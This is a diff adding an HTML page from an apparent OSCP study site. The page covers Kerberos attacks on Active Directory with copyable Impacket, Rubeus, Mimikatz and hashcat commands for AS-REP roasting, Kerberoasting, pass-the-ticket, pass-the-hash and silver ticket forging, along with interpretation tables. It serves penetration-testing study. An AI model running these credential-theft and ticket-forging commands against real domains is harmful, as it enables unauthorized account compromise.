@@ -1,0 +1,507 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Kerberos and Identity Transitions."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Kerberos and Identity Transitions | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Kerberos and Identity Transitions."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/"><title>Kerberos and Identity Transitions | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#1-kerberos-model-and-prerequisites">1. Kerberos model and prerequisites</a></li><li class="level-2"><a href="#2-password-policy-and-bounded-validation">2. Password policy and bounded validation</a></li><li class="level-2"><a href="#3-as-rep-roasting">3. AS-REP roasting</a></li><li class="level-3"><a href="#why-as-rep-roasting-works">Why AS-REP roasting works</a></li><li class="level-3"><a href="#one-known-user-no-password">One known user, no password</a></li><li class="level-3"><a href="#supplied-user-list-no-password">Supplied user list, no password</a></li><li class="level-3"><a href="#authenticated-directory-backed-discovery">Authenticated directory-backed discovery</a></li><li class="level-3"><a href="#windowsrubeus-alternative">Windows/Rubeus alternative</a></li><li class="level-3"><a href="#interpret-before-cracking">Interpret before cracking</a></li><li class="level-2"><a href="#4-kerberoasting">4. Kerberoasting</a></li><li class="level-3"><a href="#why-kerberoasting-works">Why Kerberoasting works</a></li><li class="level-3"><a href="#enumerate-without-requesting-tickets">Enumerate without requesting tickets</a></li><li class="level-3"><a href="#request-one-selected-user">Request one selected user</a></li><li class="level-3"><a href="#hash-type-and-cracking">Hash type and cracking</a></li><li class="level-3"><a href="#common-failures">Common failures</a></li><li class="level-2"><a href="#5-targeted-kerberoasting-from-object-control">5. Targeted Kerberoasting from object control</a></li><li class="level-2"><a href="#6-ticket-inventory-classification-and-conversion">6. Ticket inventory, classification and conversion</a></li><li class="level-2"><a href="#7-pass-the-ticket-and-key-to-ticket-transitions">7. Pass-the-Ticket and key-to-ticket transitions</a></li><li class="level-2"><a href="#8-silver-tickets-forge-one-service-ticket">8. Silver tickets: forge one service ticket</a></li><li class="level-2"><a href="#9-re-enumerate-every-new-identity">9. Re-enumerate every new identity</a></li><li class="level-2"><a href="#10-failure-router">10. Failure router</a></li><li class="level-2"><a href="#tooling-for-this-section">Tooling for this section</a></li><li class="level-2"><a href="#timeroast--offline-recovery-of-weak-computer-account-passwords-via-ms-sntp">Timeroast — offline recovery of weak computer-account passwords via MS-SNTP</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="kerberos-and-identity-transitions">Kerberos and Identity Transitions</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/README.md">← Stage index</a> | <a href="/tools/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Domain mapping</a> | <a href="/tools/oscp/reference/06-ad-lateral-movement/02-credential-access/">Credential access</a> | <a href="/tools/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential handling</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/active-directory.md">AD cheatsheet</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/credentials.md">Recover and use authentication material</a>; <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/ad-mapping.md">Map Active Directory attack paths</a>; <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/ad-identities.md">Gain a more useful domain identity</a></p>
+<blockquote>
+<p><strong>Purpose:</strong> convert a validated Block 10 identity/account/SPN/ticket candidate into typed offline material or a new authenticated identity, then return to mapping.</p>
+<p><strong>Boundary:</strong> ticket requests and local ticket handling are covered here. Matching the resulting password/hash/ticket to remote execution is <a href="/tools/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Block 12 lateral movement</a>.</p>
+</blockquote>
+<h2 id="1-kerberos-model-and-prerequisites">1. Kerberos model and prerequisites</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">AS-REQ/AS-REP: user proves knowledge of long-term key -> receives TGT
+TGS-REQ/TGS-REP: TGT requests SERVICE/HOST -> receives service ticket
+AP-REQ: client presents service ticket -> service authenticates client
+AUTHORIZATION: target service still evaluates the represented identity/claims
+</code></pre>
+<p>Before changing credentials or tools:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">getent hosts DC_HOST
+nc -nvz DC_IP 88
+date -u
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">w32tm /query /status
+klist
+</code></pre>
+<p>Record domain FQDN/realm, DC FQDN/IP, source DNS, current time, KDC route and exact target SPN. IP connectivity does not replace hostname/SPN correctness.</p>
+<h2 id="2-password-policy-and-bounded-validation">2. Password policy and bounded validation</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">net accounts /domain
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess
+</code></pre>
+<p>Password validation belongs to the existing <a href="/tools/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">credential procedure</a>. Do not spray by default. If explicitly required, account for lockout threshold, duration, observation window and prior failures; use one justified candidate, stop on lockout/rate-limit evidence and preserve successful identities separately.</p>
+<h2 id="3-as-rep-roasting">3. AS-REP roasting</h2>
+<h3 id="why-as-rep-roasting-works">Why AS-REP roasting works</h3>
+<p>Ordinary Kerberos preauthentication makes the user prove knowledge of the long-term key before the KDC returns AS-REP material. If the account has <code>DONT_REQUIRE_PREAUTH</code>, an unauthenticated requester can ask for an AS-REP whose encrypted component can be tested offline against password candidates.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">KNOWN USERNAME + PREAUTH DISABLED + KDC REACHABLE
+-> AS-REP CIPHER
+-> OFFLINE GUESSING
+-> PASSWORD ONLY IF A CANDIDATE VERIFIES
+</code></pre>
+<h3 id="one-known-user-no-password">One known user, no password</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request \
+  -dc-ip DC_IP -outputfile asrep-TARGET_USER.hashes
+</code></pre>
+<h3 id="supplied-user-list-no-password">Supplied user list, no password</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-GetNPUsers 'DOMAIN/' -no-pass -request -usersfile users.txt \
+  -dc-ip DC_IP -outputfile asrep.hashes
+</code></pre>
+<h3 id="authenticated-directory-backed-discovery">Authenticated directory-backed discovery</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-GetNPUsers 'DOMAIN/USER' -request \
+  -dc-ip DC_IP -outputfile asrep.hashes
+</code></pre>
+<p>Omitting the password from the target lets the tool prompt rather than storing it in shell history.</p>
+<h3 id="windowsrubeus-alternative">Windows/Rubeus alternative</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:asrep.hashes /format:hashcat
+</code></pre>
+<h3 id="interpret-before-cracking">Interpret before cracking</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Output</th><th>Meaning</th><th>Next action</th></tr></thead><tbody><tr><td><code>$krb5asrep$23$</code></td><td>RC4 AS-REP offline verifier</td><td>Hashcat mode 18200</td></tr><tr><td>AS-REP with another etype</td><td>Different cipher/format</td><td>Match the exact prefix to installed Hashcat/John support</td></tr><tr><td><code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code></td><td>User/realm not found</td><td>Recheck spelling, realm and DC</td></tr><tr><td>Preauthentication required / no <code>UF_DONT_REQUIRE_PREAUTH</code></td><td>Account is not roastable through this method</td><td>Disprove this path for that account</td></tr><tr><td>Timeout/name error</td><td>KDC route/DNS problem</td><td>Fix route/FQDN/time before account conclusions</td></tr></tbody></table>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -m 18200 asrep.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 18200 asrep.hashes --show
+</code></pre>
+<p>Do not call the account compromised because a hash was captured. Only a verified offline candidate produces a password, and that password still needs identity/access mapping.</p>
+<h2 id="4-kerberoasting">4. Kerberoasting</h2>
+<h3 id="why-kerberoasting-works">Why Kerberoasting works</h3>
+<p>Any valid domain identity can normally request a service ticket for an SPN. The ticket is encrypted with key material belonging to the SPN account, allowing offline password guessing.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">VALID DOMAIN IDENTITY + SPN ACCOUNT + KDC ROUTE
+-> TGS-REP CIPHER
+-> OFFLINE GUESSING
+-> SERVICE-ACCOUNT PASSWORD IF A CANDIDATE VERIFIES
+</code></pre>
+<p>Rank SPN accounts before requesting tickets: group/ACL value, service/host, account type, password age, enabled state and resulting access matter more than collecting every ticket.</p>
+<h3 id="enumerate-without-requesting-tickets">Enumerate without requesting tickets</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER'
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe kerberoast /stats /domain:DOMAIN /dc:DC_HOST
+</code></pre>
+<h3 id="request-one-selected-user">Request one selected user</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \
+  -outputfile kerberoast-TARGET_USER.hashes 'DOMAIN/USER'
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe kerberoast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes
+</code></pre>
+<details>
+<summary><strong>Request all mapped candidates</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-GetUserSPNs -request -dc-ip DC_IP \
+  -outputfile kerberoast.hashes 'DOMAIN/USER'
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes
+</code></pre>
+<p>Use broad requests only when scope and the candidate inventory justify them. Prefer one ranked account during verification.</p>
+</details>
+<h3 id="hash-type-and-cracking">Hash type and cracking</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Prefix</th><th align="right">Kerberos etype</th><th align="right">Hashcat mode</th></tr></thead><tbody><tr><td><code>$krb5tgs$23$</code></td><td align="right">RC4-HMAC</td><td align="right">13100</td></tr><tr><td><code>$krb5tgs$17$</code></td><td align="right">AES128</td><td align="right">19600</td></tr><tr><td><code>$krb5tgs$18$</code></td><td align="right">AES256</td><td align="right">19700</td></tr></tbody></table>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -m 13100 kerberoast.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 19600 kerberoast-aes128.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 19700 kerberoast-aes256.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m MODE HASH_FILE --show
+</code></pre>
+<p>Select the mode from the actual prefix and current <code>hashcat --example-hashes</code>; do not assume every TGS is RC4. AES material is still an offline verifier but generally costs more per guess. Cracking feasibility is governed mainly by password strength and candidates, not merely ticket acquisition.</p>
+<h3 id="common-failures">Common failures</h3>
+<ul>
+<li>no SPNs returned: wrong domain/base/authentication context, filtering or no user SPNs;</li>
+<li><code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code>: SPN is absent/malformed or queried in the wrong realm;</li>
+<li><code>KDC_ERR_ETYPE_NOSUPP</code>: requested cipher conflicts with account/domain policy;</li>
+<li>output wraps or fails to load: save directly to an output file and verify prefix/line integrity;</li>
+<li>crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.”</li>
+</ul>
+<h2 id="5-targeted-kerberoasting-from-object-control">5. Targeted Kerberoasting from object control</h2>
+<p>If Block 10 proved effective write access to a user object's <code>servicePrincipalName</code>, an SPN can be temporarily added, requested and removed. This is a state-changing directory attack and must preserve original state.</p>
+<p>Built-in SPN operations:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">setspn -L TARGET_USER
+setspn -S temporary/TARGET_USER TARGET_USER
+</code></pre>
+<p>Request only that account:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \
+  -outputfile targeted-TARGET_USER.hashes 'DOMAIN/USER'
+</code></pre>
+<p>Cleanup:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">setspn -D temporary/TARGET_USER TARGET_USER
+setspn -L TARGET_USER
+</code></pre>
+<p>The controlled right must apply to the SPN attribute, <code>-S</code> must not collide with an existing SPN, and cleanup is part of the procedure. A recovered password is still validated and mapped as a new identity.</p>
+<h2 id="6-ticket-inventory-classification-and-conversion">6. Ticket inventory, classification and conversion</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">klist
+klist tgt
+klist sessions
+klist -li 0xLUID tickets
+klist -li 0xLUID tgt
+Rubeus.exe triage
+Rubeus.exe dump /luid:0xLUID /nowrap
+</code></pre>
+<blockquote>
+<p>Do not run <code>klist purge</code> during triage.</p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Field/pattern</th><th>Interpretation</th><th>Decision</th></tr></thead><tbody><tr><td><code>Client: USER @ REALM</code></td><td>Identity represented</td><td>Map that exact user/computer and realm</td></tr><tr><td>Client ending in <code>$</code></td><td>Computer identity</td><td>Establish machine-account rights; do not treat as a human user</td></tr><tr><td><code>Server: krbtgt/REALM</code></td><td>TGT</td><td>Can request service tickets while valid, within that client's authorization</td></tr><tr><td><code>Server: cifs/HOST</code></td><td>CIFS service ticket</td><td>Only SMB/CIFS on the named host; authorization still applies</td></tr><tr><td><code>Server: ldap/DC_HOST</code></td><td>LDAP service ticket</td><td>LDAP authentication, not replication rights</td></tr><tr><td>Other <code>SERVICE/HOST</code></td><td>Ticket for that SPN</td><td>Use matching hostname/service/client</td></tr><tr><td><code>Start/End/Renew Time</code></td><td>Validity windows</td><td>Import cannot revive an expired/not-yet-valid ticket</td></tr><tr><td>Ticket flags</td><td>Kerberos behavior/history</td><td>Not evidence of privilege</td></tr><tr><td><code>Kdc Called</code></td><td>Issuing KDC</td><td>Not evidence of access to that DC</td></tr><tr><td>Encryption/session key</td><td>Compatibility/policy clue</td><td>Not privilege or password strength</td></tr></tbody></table>
+<p>Linux cache:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">klist -c ticket.ccache
+export KRB5CCNAME="$PWD/ticket.ccache"
+</code></pre>
+<p>Convert only when a client expects the other container:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-ticketConverter ticket.kirbi ticket.ccache
+impacket-ticketConverter ticket.ccache ticket.kirbi
+</code></pre>
+<h2 id="7-pass-the-ticket-and-key-to-ticket-transitions">7. Pass-the-Ticket and key-to-ticket transitions</h2>
+<p>These commands establish a local ticket context. Block 12 selects and validates the remote service.</p>
+<p>Windows/Rubeus:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe ptt /ticket:ticket.kirbi
+klist
+</code></pre>
+<p>Windows/Mimikatz:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">kerberos::ptt ticket.kirbi
+kerberos::list
+</code></pre>
+<p>Linux:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">export KRB5CCNAME="$PWD/ticket.ccache"
+klist
+</code></pre>
+<p>NT hash or AES key to a TGT:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt
+klist
+</code></pre>
+<p>Use <code>/aes128:</code> or <code>/aes256:</code> when that is the actual key type and tool version supports it. RC4-based requests can fail where RC4 is disabled even though the NT hash is correct.</p>
+<p>Mimikatz creates a new process using supplied key material:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:cmd.exe
+</code></pre>
+<p>This is a credential/ticket-context transition, not proof that a destination accepts the identity.</p>
+<h2 id="8-silver-tickets-forge-one-service-ticket">8. Silver tickets: forge one service ticket</h2>
+<blockquote>
+<p><strong>Prerequisite:</strong> key/hash of the account encrypting the target SPN's tickets, domain SID, exact SPN/service/host, a plausible existing domain identity and compatible target-service validation behavior.</p>
+</blockquote>
+<p>Linux/Impacket:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID \
+  -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER
+export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
+klist
+</code></pre>
+<p>Windows/Mimikatz:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /target:TARGET_HOST /service:cifs /rc4:SERVICE_NT_HASH /user:AUTHORIZED_TEST_USER /ptt
+</code></pre>
+<p>Despite the Mimikatz module name, supplying a service/target key produces a silver/service ticket, not a krbtgt-signed TGT.</p>
+<p>Important boundaries:</p>
+<ul>
+<li>the key must belong to the account that owns the SPN; machine-account keys commonly protect host services;</li>
+<li>the ticket is limited to the named service/host and whichever services share the same account key;</li>
+<li>current PAC enforcement means using a nonexistent identity can fail; use a real authorized test identity and validate behavior;</li>
+<li>a service may perform KDC/PAC validation or additional authorization;</li>
+<li>a successfully imported ticket is not successful service access.</li>
+</ul>
+<p>Golden tickets require the KRBTGT key and domain SID and create a forged TGT. They are a high-impact persistence concept covered in the <a href="/tools/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#conditional-high-impact-ticket-forging-concepts">conditional domain-compromise section</a>, not a default Block 11 action.</p>
+<h2 id="9-re-enumerate-every-new-identity">9. Re-enumerate every new identity</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">NEW PASSWORD/HASH/KEY/TICKET
+-> VERIFY TYPE, CLIENT, REALM, VALIDITY
+-> AUTHENTICATE THROUGH ONE COMPATIBLE SERVICE
+-> CONFIRM IDENTITY
+-> REPEAT GROUP/ACL/SHARE/HOST/SESSION/ROUTE MAPPING
+</code></pre>
+<p>Do not overwrite the old state. Record which source produced the material and which protocol accepted it.</p>
+<h2 id="10-failure-router">10. Failure router</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Symptom</th><th>Layer</th><th>Next test</th></tr></thead><tbody><tr><td>KDC unreachable</td><td>Route/service</td><td>DNS/FQDN, TCP/UDP 88, pivot path</td></tr><tr><td>Clock-skew error</td><td>Time</td><td>Synchronize source to authorized domain time</td></tr><tr><td>Principal unknown</td><td>Identity/realm</td><td>Exact username, realm and DC</td></tr><tr><td>Preauth required</td><td>AS-REP prerequisite absent</td><td>Disprove AS-REP roast for that account</td></tr><tr><td>No SPNs</td><td>Enumeration/context</td><td>Correct domain, bind identity, filter and account type</td></tr><tr><td>Etype unsupported</td><td>Cipher policy</td><td>Use supported account/domain/tool path; do not blame password</td></tr><tr><td>Hashcat loads zero hashes</td><td>Format/mode/file integrity</td><td>Inspect prefix, wrapping and mode examples</td></tr><tr><td>Exhausted wordlist</td><td>Candidate model failed</td><td>Improve candidates or deprioritize; no credential was recovered</td></tr><tr><td>Ticket import succeeds, access fails</td><td>SPN/service/authorization/route</td><td>Client, validity, hostname, service class and target rights</td></tr><tr><td>Silver ticket rejected</td><td>Wrong key/SPN/domain SID/PAC behavior</td><td>Revalidate every prerequisite; use a real authorized identity</td></tr><tr><td>NT hash to TGT fails</td><td>RC4 disabled or identity/key mismatch</td><td>Exact key type, realm, user and KDC policy</td></tr></tbody></table>
+<h2 id="tooling-for-this-section">Tooling for this section</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
